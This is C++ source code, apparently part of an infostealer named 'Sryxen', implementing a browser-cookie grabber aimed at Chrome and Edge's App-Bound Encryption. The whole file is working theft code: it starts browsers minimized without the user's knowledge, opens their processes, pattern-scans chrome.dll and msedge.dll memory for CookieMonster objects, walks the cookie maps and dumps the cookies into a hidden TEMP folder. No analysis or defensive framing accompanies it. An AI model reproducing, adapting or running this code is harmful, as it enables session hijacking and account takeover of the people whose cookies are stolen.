#include <Windows.h>
#include <shlwapi.h>
#include <stdio.h>
#include "Helper.h"
#include "Process.h"
#include "Memory.h"
#include "Version.h"
#include "Pattern.h"
#include <TlHelp32.h>
#include <vector>
#include <fstream>
#include <string>
#include <Lmcons.h> 
#include <filesystem>
#include "Sryxen.hpp"

#define _CRT_SECURE_NO_DEPRECATE
#pragma comment(lib, "shlwapi.lib")

void PrintErrorAndExit(const char* message) {
    PRINT(message);  // Print the error message
    fflush(stdout);  // Ensure all output is written before exiting
    exit(1);
}

std::wstring ConvertToWide(const char* ansiStr) {
    int len = MultiByteToWideChar(CP_UTF8, 0, ansiStr, -1, NULL, 0);
    std::wstring wideStr(len, 0);
    MultiByteToWideChar(CP_UTF8, 0, ansiStr, -1, &wideStr[0], len);
    return wideStr;
}

// Logging Function
void LogMessage(const std::string& msg) {
    std::string logFilePath = std::string(getenv("TEMP")) + "\\sryxen\\console_log.txt";
    std::ofstream logFile(logFilePath, std::ios::app);
    if (logFile.is_open()) {
        logFile << msg << std::endl;
        logFile.close();
    }
}



void DetermineTargetConfig(BrowserVersion& browserVersion, TargetVersion& targetConfig) {
    if (targetConfig == Chrome) {
        if (browserVersion.highMajor >= 131 && browserVersion.highMinor >= 6778)
            targetConfig = Chrome;
        else if (browserVersion.highMajor <= 131 && browserVersion.highMinor < 6778 &&
            browserVersion.highMajor >= 125 && browserVersion.highMinor > 6387)
            targetConfig = Chrome130;
        else if ((browserVersion.highMajor == 125 && browserVersion.highMinor <= 6387) ||
            (browserVersion.highMajor == 124 && browserVersion.highMinor >= 6329))
            targetConfig = Chrome124;
        else
            targetConfig = OldChrome;
    }
    else if (targetConfig == Edge || targetConfig == Webview2) {
        if (browserVersion.highMajor >= 131 && browserVersion.highMinor >= 2903)
            targetConfig = Edge;
        else if (browserVersion.highMajor <= 131 && browserVersion.highMinor < 2903 ||
            browserVersion.highMajor > 124)
            targetConfig = Edge130;
        else
            targetConfig = OldEdge;
    }
}


BOOL GetTargetProcessDetails(DWORD& pid, HANDLE& hProcess, TargetVersion targetConfig) {
    hProcess = NULL; 
    pid = 0;

    LPCWSTR targetProcess = nullptr;
    LPCWSTR targetDll = nullptr;

    switch (targetConfig) {
    case Chrome: case OldChrome: case Chrome124:
        targetProcess = L"chrome.exe";
        targetDll = L"chrome.dll";
        break;
    case Edge: case OldEdge: case Webview2:
        targetProcess = (targetConfig == Webview2) ? L"msedgewebview2.exe" : L"msedge.exe";
        targetDll = L"msedge.dll";
        break;
    default:
        return FALSE;
    }

    if (!targetProcess || !targetDll) {
        return FALSE;
    }

    if (!FindCorrectProcessPID(targetProcess, &pid, &hProcess) || !hProcess) {
        return FALSE;
    }

    if (IsWow64(hProcess)) {
        CloseHandle(hProcess);
        hProcess = NULL; 
        return FALSE;
    }

    return TRUE;
}


void ProcessCookieMonsters(HANDLE hProcess, TargetVersion targetConfig, uintptr_t* CookieMonsterInstances, size_t szCookieMonster) {
    if (!CookieMonsterInstances || szCookieMonster == 0) return;

    for (size_t i = 0; i < szCookieMonster; i++) {
        if (!CookieMonsterInstances[i]) continue;

        uintptr_t CookieMapOffset = CookieMonsterInstances[i] + sizeof(uintptr_t) + 0x28;
        WalkCookieMap(hProcess, CookieMapOffset, targetConfig);
    }
}

BOOL IsProcessRunning(const wchar_t* processName) {
    if (!processName || wcslen(processName) == 0) {
        return FALSE; // Invalid input, return false
    }

    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) {
        return FALSE; // Failed to get process snapshot, return false
    }

    PROCESSENTRY32 pe32;
    ZeroMemory(&pe32, sizeof(pe32));
    pe32.dwSize = sizeof(PROCESSENTRY32);

    BOOL found = FALSE;

    if (Process32First(hSnap, &pe32)) {
        do {
            if (_wcsicmp(pe32.szExeFile, processName) == 0) {
                found = TRUE;
                break;
            }
        } while (Process32Next(hSnap, &pe32));
    }

    CloseHandle(hSnap);
    return found;
}


void StartProcessMinimized(const wchar_t* processPath) {
    // Added Check since if it doesnt exists, it errors
    if (!std::filesystem::exists(processPath))
        return;

    STARTUPINFO si = { sizeof(si) };  // Correct initialization
    PROCESS_INFORMATION pi = { 0 };

    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_SHOWMINIMIZED;

    if (!CreateProcessW(processPath, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        wprintf(L"[-] Failed to start process %ls with error code %lu\n", processPath, GetLastError());
    }
    else {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}



void CheckArch() {
#ifndef _WIN64
    PRINT("[-] 32bit version is not currently supported.\n");
    exit(1);
#endif // !_WIN64
}


void AppBoundEntry() {
    LogMessage("[INFO] ABE Grabber Started");

    DWORD pid = 0;
    HANDLE hProcess = NULL;
    std::vector<TargetVersion> targetConfigs;

    std::wstring edgePath = L"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe";
    std::wstring chromePath = L"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe";

    // Start browsers if not running
    if (!IsProcessRunning(L"msedge.exe")) StartProcessMinimized(edgePath.c_str());
    if (!IsProcessRunning(L"chrome.exe")) StartProcessMinimized(chromePath.c_str());
    Sleep(1000);

    if (IsProcessRunning(L"chrome.exe")) targetConfigs.push_back(Chrome);
    if (IsProcessRunning(L"msedge.exe")) targetConfigs.push_back(Edge);

    // Get TEMP Path
    char tempPath[MAX_PATH];
    if (GetEnvironmentVariableA("TEMP", tempPath, MAX_PATH)) {
        strcat_s(tempPath, "\\sryxen");

        // Create directory if missing
        if (GetFileAttributesA(tempPath) == INVALID_FILE_ATTRIBUTES) {
            if (!CreateDirectoryA(tempPath, NULL)) {
                LogMessage("[ERROR] Failed to create directory: " + std::string(tempPath));
                return;
            }
        }

        // Test File Creation
        std::ofstream testFile(std::string(tempPath) + "\\test.txt");
        if (!testFile.is_open()) {
            LogMessage("[ERROR] Failed to create test file in TEMP directory.");
            return;
        }
        testFile.close();
        LogMessage("[INFO] Test file created successfully.");

        // Process each browser
        for (const TargetVersion& targetConfig : targetConfigs) {
            std::string logFileName = (targetConfig == Chrome) ? "chrome_abe.txt" : "edge_abe.txt";
            std::string fullLogPath = std::string(tempPath) + "\\" + logFileName;

            FILE* logFile = nullptr;
            if (freopen_s(&logFile, fullLogPath.c_str(), "w", stdout) != 0 || !logFile) {
                LogMessage("[ERROR] Failed to open log file: " + fullLogPath);
                continue;
            }

            // Get process details
            if (!GetTargetProcessDetails(pid, hProcess, targetConfig)) {
                LogMessage("[ERROR] Failed to get process details.");
                fclose(stdout);
                continue;
            }

            // Extract Browser Version
            BrowserVersion browserVersion = { 0 };
            if (!GetBrowserVersion(hProcess, browserVersion)) {
                LogMessage("[ERROR] Failed to get browser version.");
                CloseHandle(hProcess);
                fclose(stdout);
                continue;
            }

            for (TargetVersion& tConfig : targetConfigs) {
                DetermineTargetConfig(browserVersion, tConfig);
            }

            // Find DLL
            uintptr_t chromeDllAddress = 0;
            DWORD moduleSize = 0;
            const wchar_t* targetDll = (targetConfig == Edge) ? L"msedge.dll" : L"chrome.dll";

            if (!GetRemoteModuleBaseAddress(hProcess, targetDll, chromeDllAddress, &moduleSize)) {
                LogMessage("[ERROR] Failed to get module base address.");
                CloseHandle(hProcess);
                fclose(stdout);
                continue;
            }  // Locate Memory Section
            uintptr_t targetSection = 0;
            if (!FindLargestSection(hProcess, chromeDllAddress, targetSection)) {
                LogMessage("[ERROR] Failed to find largest section.");
                CloseHandle(hProcess);
                fclose(stdout);
                continue;
            }

            // Search for CookieMonsterInstances
            uintptr_t* CookieMonsterInstances = (uintptr_t*)calloc(1000, sizeof(uintptr_t));
            size_t szCookieMonster = 0;
            if (!FindPattern(hProcess, pattern, szPattern, CookieMonsterInstances, szCookieMonster)) {
                LogMessage("[ERROR] Failed to find pattern.");
                free(CookieMonsterInstances);
                CloseHandle(hProcess);
                fclose(stdout);
                continue;
            }

            // Process Cookies
            ProcessCookieMonsters(hProcess, targetConfig, CookieMonsterInstances, szCookieMonster);
            free(CookieMonsterInstances);
            fclose(stdout);
        }
    }
    else {
        LogMessage("[ERROR] Failed to get TEMP directory.");
    }

    if (hProcess) CloseHandle(hProcess);
    LogMessage("[INFO] ABE Grabber Finished");
}
